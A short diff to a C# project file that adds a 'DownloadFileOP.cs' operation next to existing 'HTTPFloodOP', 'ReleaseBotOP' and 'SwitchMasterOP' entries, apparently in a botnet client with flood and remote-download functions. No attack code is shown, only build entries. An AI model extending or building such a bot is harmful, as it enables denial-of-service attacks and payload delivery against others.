@@ -63,6 +63,7 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Operations\DownloadFileOP.cs" />
     <Compile Include="Operations\ReleaseBotOP.cs" />
     <Compile Include="Operations\HTTPFloodOP.cs" />
     <Compile Include="Operations\SwitchMasterOP.cs" />
